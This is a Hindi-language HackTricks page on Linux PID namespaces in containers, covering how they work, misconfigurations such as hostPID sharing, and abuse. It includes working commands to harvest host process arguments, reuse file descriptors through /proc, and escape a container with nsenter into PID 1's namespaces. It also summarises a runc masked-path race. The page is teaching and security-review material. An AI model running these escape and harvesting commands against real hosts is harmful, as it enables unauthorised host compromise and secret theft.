# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## अवलोकन

PID namespace यह नियंत्रित करता है कि processes को कैसे number किया जाता है और कौन-से processes दिखाई देते हैं। इसी कारण कोई container अपना PID 1 रख सकता है, भले ही वह वास्तविक machine न हो। Namespace के अंदर workload को एक local process tree दिखाई देता है। Namespace के बाहर host को वास्तविक host PIDs और पूरा process landscape दिखाई देता है।

Security के दृष्टिकोण से PID namespace महत्वपूर्ण है क्योंकि process visibility मूल्यवान होती है। जब कोई workload host processes को देख सकता है, तो वह service names, command-line arguments, process arguments में दिए गए secrets, `/proc` के माध्यम से environment-derived state और संभावित namespace-entry targets को observe कर सकता है। यदि वह केवल इन processes को देखने के बजाय सही परिस्थितियों में signals भेजने या ptrace का उपयोग करने जैसे अन्य कार्य भी कर सकता है, तो समस्या कहीं अधिक गंभीर हो जाती है।

## संचालन

एक नया PID namespace अपनी अलग internal process numbering के साथ शुरू होता है। इसके अंदर बनाया गया पहला process namespace के दृष्टिकोण से PID 1 बन जाता है। इसका अर्थ यह भी है कि orphaned children और signal behavior के लिए उसे विशेष init-like semantics मिलती हैं। इससे init processes, zombie reaping और containers में कभी-कभी tiny init wrappers के उपयोग से जुड़ी कई container असामान्यताएँ स्पष्ट होती हैं।

महत्वपूर्ण security lesson यह है कि कोई process isolated दिखाई दे सकता है क्योंकि उसे केवल अपना PID tree दिखाई देता है, लेकिन इस isolation को जानबूझकर हटाया जा सकता है। Docker इसे `--pid=host` के माध्यम से expose करता है, जबकि Kubernetes इसे `hostPID: true` के माध्यम से करता है। जब container host PID namespace में शामिल हो जाता है, तो workload को host processes सीधे दिखाई देने लगते हैं और बाद के कई attack paths कहीं अधिक वास्तविक हो जाते हैं।

## Lab

PID namespace manually बनाने के लिए:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
अब shell को एक private process view दिखाई देता है। `--mount-proc` flag महत्वपूर्ण है क्योंकि यह नए PID namespace से मेल खाने वाला procfs instance mount करता है, जिससे अंदर से process list coherent रहती है।

Container behavior की तुलना करने के लिए:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
अंतर तुरंत और आसानी से समझ में आ जाता है, यही कारण है कि यह readers के लिए एक अच्छा पहला lab है।

## Runtime Usage

Docker, Podman, containerd और CRI-O में सामान्य containers को अपना PID namespace मिलता है। Kubernetes Pods को भी आमतौर पर एक isolated PID view मिलता है, जब तक कि workload स्पष्ट रूप से host PID sharing का अनुरोध न करे। LXC/Incus environments भी इसी kernel primitive पर निर्भर करते हैं, हालांकि system-container use cases अधिक जटिल process trees दिखा सकते हैं और अधिक debugging shortcuts को बढ़ावा दे सकते हैं।

वही नियम हर जगह लागू होता है: यदि runtime ने PID namespace को isolate न करने का विकल्प चुना है, तो यह container boundary में जानबूझकर की गई कमी है।

## Misconfigurations

सबसे सामान्य misconfiguration host PID sharing है। Teams अक्सर debugging, monitoring या service-management की सुविधा के लिए इसे उचित ठहराती हैं, लेकिन इसे हमेशा एक महत्वपूर्ण security exception माना जाना चाहिए। भले ही container के पास host processes पर तत्काल write primitive न हो, केवल visibility ही system के बारे में बहुत कुछ उजागर कर सकती है। `CAP_SYS_PTRACE` जैसी capabilities या उपयोगी procfs access जुड़ने पर risk काफी बढ़ जाता है।

एक अन्य गलती यह मानना है कि क्योंकि workload default रूप से host processes को kill या ptrace नहीं कर सकता, इसलिए host PID sharing harmless है। यह निष्कर्ष enumeration के महत्व, namespace-entry targets की उपलब्धता और अन्य कमजोर किए गए controls के साथ PID visibility के संयोजन को नज़रअंदाज़ करता है।

## Abuse

यदि host PID namespace shared है, तो attacker host processes का निरीक्षण कर सकता है, process arguments harvest कर सकता है, interesting services की पहचान कर सकता है, `nsenter` के लिए candidate PIDs ढूँढ सकता है, या host अथवा neighboring workloads में हस्तक्षेप करने के लिए process visibility को ptrace-related privilege के साथ combine कर सकता है। कुछ मामलों में, केवल सही long-running process दिखाई देना ही attack plan के बाकी हिस्से को बदलने के लिए पर्याप्त होता है।

पहला practical step हमेशा यह पुष्टि करना होता है कि host processes वास्तव में दिखाई दे रहे हैं:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
जब host PIDs दिखाई देने लगते हैं, तो process arguments और namespace-entry targets अक्सर सबसे उपयोगी information source बन जाते हैं:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
यदि `nsenter` उपलब्ध है और पर्याप्त privilege मौजूद हैं, तो जाँचें कि क्या किसी visible host process का उपयोग namespace bridge के रूप में किया जा सकता है:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Entry block होने पर भी, host PID sharing पहले से ही valuable है क्योंकि यह service layout, runtime components, और आगे target करने के लिए candidate privileged processes को reveal करता है।

Host PID visibility file-descriptor abuse को भी अधिक realistic बनाती है। यदि किसी privileged host process या neighboring workload के पास कोई sensitive file या socket open है, तो attacker `/proc/<pid>/fd/` को inspect करके उस handle का reuse कर सकता है, जो ownership, procfs mount options, और target service model पर निर्भर करता है।
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
ये commands इस बात का उत्तर देने के लिए उपयोगी हैं कि क्या `hidepid=1` या `hidepid=2` cross-process visibility को कम कर रहा है और क्या खुले secret files, logs या Unix sockets जैसे स्पष्ट रूप से महत्वपूर्ण descriptors बिल्कुल दिखाई दे रहे हैं।

### पूर्ण उदाहरण: host PID + `nsenter`

जब process के पास host namespaces में शामिल होने के लिए पर्याप्त privilege भी हो, तो host PID sharing सीधे host escape में बदल जाती है:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
यदि command सफल होता है, तो container process अब host के mount, UTS, network, IPC और PID namespaces में execute हो रहा है। इसका प्रभाव तत्काल host compromise होता है।

भले ही `nsenter` स्वयं मौजूद न हो, host filesystem mounted होने पर host binary के माध्यम से भी यही परिणाम प्राप्त किया जा सकता है:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### हालिया Runtime Notes

कुछ PID-namespace-relevant attacks पारंपरिक `hostPID: true` misconfigurations नहीं हैं, बल्कि container setup के दौरान procfs protections लागू करने के तरीके से संबंधित runtime implementation bugs हैं।

#### `maskedPaths` race to host procfs

vulnerable `runc` versions में, container image या `runc exec` workload को control करने वाले attackers, container-side `/dev/null` को `/proc/sys/kernel/core_pattern` जैसे sensitive procfs path के symlink से replace करके masking phase में race कर सकते थे। यदि race सफल हो जाती, तो masked-path bind mount गलत target पर लग सकता था और नए container के लिए host-global procfs knobs expose कर सकता था।<sup>[[1]](#references)</sup>

Useful review command:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
यह महत्वपूर्ण है क्योंकि अंतिम प्रभाव direct procfs exposure जैसा ही हो सकता है: writable `core_pattern` या `sysrq-trigger`, जिसके बाद host code execution या denial of service हो सकता है।

#### Namespace injection with `insject`

`insject` जैसे Namespace injection tools दिखाते हैं कि PID-namespace interaction के लिए process creation से पहले target namespace में प्रवेश करना हमेशा आवश्यक नहीं होता। कोई helper बाद में attach कर सकता है, `setns()` का उपयोग कर सकता है और target PID space में visibility बनाए रखते हुए execution कर सकता है:<sup>[[2]](#references)</sup>
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
इस तरह की technique मुख्यतः advanced debugging, offensive tooling और post-exploitation workflows के लिए महत्वपूर्ण होती है, जहाँ runtime द्वारा workload को initialize किए जाने के बाद namespace context को join करना आवश्यक होता है।

### संबंधित FD Abuse Patterns

जब host PIDs दिखाई दे रहे हों, तो दो patterns को स्पष्ट रूप से ध्यान में रखना उपयोगी है। पहला, कोई privileged process किसी sensitive file descriptor को `execve()` के दौरान खुला रख सकता है, क्योंकि उस पर `O_CLOEXEC` mark नहीं किया गया था। दूसरा, services `SCM_RIGHTS` के माध्यम से Unix sockets पर file descriptors भेज सकती हैं। दोनों मामलों में महत्वपूर्ण object अब pathname नहीं, बल्कि पहले से खुला हुआ handle होता है, जिसे lower-privilege process inherit या receive कर सकता है।

Container work में यह इसलिए महत्वपूर्ण है क्योंकि handle `docker.sock`, किसी privileged log, host secret file या किसी अन्य high-value object की ओर point कर सकता है, भले ही container filesystem से उस path तक सीधे पहुँचना संभव न हो।

## Checks

इन commands का उद्देश्य यह निर्धारित करना है कि process के पास private PID view है या वह पहले से कहीं अधिक विस्तृत process landscape को enumerate कर सकता है।
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
यहाँ क्या महत्वपूर्ण है:

- यदि process list में स्पष्ट host services दिखाई देती हैं, तो संभवतः host PID sharing पहले से ही प्रभावी है।
- केवल एक छोटी container-local tree दिखाई देना सामान्य baseline है; `systemd`, `dockerd`, या असंबंधित daemons दिखाई देना सामान्य नहीं है।
- एक बार host PIDs दिखाई देने लगें, तो केवल read-only process information भी उपयोगी reconnaissance बन जाती है।

यदि आपको host PID sharing के साथ चल रहा कोई container मिलता है, तो इसे केवल cosmetic difference न समझें। यह workload द्वारा देखी जा सकने वाली और संभावित रूप से प्रभावित की जा सकने वाली चीज़ों में बड़ा बदलाव है।

## References

- [1] [runc security advisory: "masked path" के दुरुपयोग के कारण mount race conditions के ज़रिए container escape (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Tool Release – insject: A Linux Namespace Injector](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)

{{#include ../../../../../banners/hacktricks-training.md}}
